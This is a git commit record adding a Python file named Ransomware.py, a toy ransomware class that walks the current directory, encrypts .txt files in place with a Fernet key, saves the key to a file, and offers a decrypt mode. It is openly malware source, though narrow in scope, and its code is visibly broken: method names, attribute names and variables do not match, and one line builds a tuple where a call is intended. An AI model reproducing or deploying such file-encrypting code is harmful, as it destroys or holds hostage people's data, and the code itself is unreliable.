9f883bc79da6c6124244c08c1f6d58f4df57344a
Matheus Antunes <38018748+Mantunes2@users.noreply.github.com>
2021-02-22 12:45:00 -0300

    Create Ransomware.py

---
+++ Ransomware.py
@@ -0,0 +1,71 @@
+import os
+from os.path import expanduser
+from cryptography.fernet import Fernet
+
+class Ransomeware(object):
+    def __init__(self):
+        self.key = None
+        self.cryptor = None
+        self.file_ext_targets = ['txt']
+
+    def gererate_key(self):
+        self.key = Fernet.generate_key()
+        self.cryptor = Fernet(self.key)
+
+    def read_key(self, keyfile_name):
+        with open(keyfile_name, "rb") as f:
+            self.key = f.read()
+            self.cryptor = Fernet(self.key)
+
+    def write_key(self, keyfile_name):
+        print(self.key)
+        with open(keyfile_name, "wb") as f:
+            f.write(self.key)
+
+    def crypt_root(self, root_dir, encrypted=False):
+        for root, _, files in os.walk(root_dir):
+            for f in files:
+                abs_files_path = os.path.join(root, f)
+
+                if not abs_files_path.split(".")[-1] in self.file_ext_targets:
+                    continue
+                self.crypt_file(abs_files_path, encrypted=encrypted)
+
+    def crypt_file(self, files_path, encrypted=False):
+        with open(files_path, "rb+") as f:
+            _data = f.read()
+            if not encrypted:
+                print()
+                print(f"File Contents before encryption: {_data}")
+                data = self.crypter, encrypt(_data)
+                print(f"File Contents after encryption: {data}")
+            else:
+                data = self.crypter.decrypt(_data)
+                print(f"File content before encryption: {data}")
+            f.seek(0)
+            f.write(data)
+
+if __name__=="__main__":
+    local.root = "."
+
+    import argparse
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--action", required=True)
+    parser.add_argument("--keyfile")
+
+    args = parser.parse_args()
+    action = args.action.lower()
+    keyfile = args.keyfile
+
+    ransome = Ransomeware()
+
+    if action == "decrypt":
+        if keyfile is None:
+            print("Path to keyfile must be specified after --keyfile for decryption")
+        else:
+            ransom.read_key(keyfile)
+            ransom.crypt_root(local_root, encrypted=True)
+    elif action == "encrypt":
+        ransom.generate_key()
+        ransom.write_key("keyfile")
+        ransom.crypt_root(local_root)
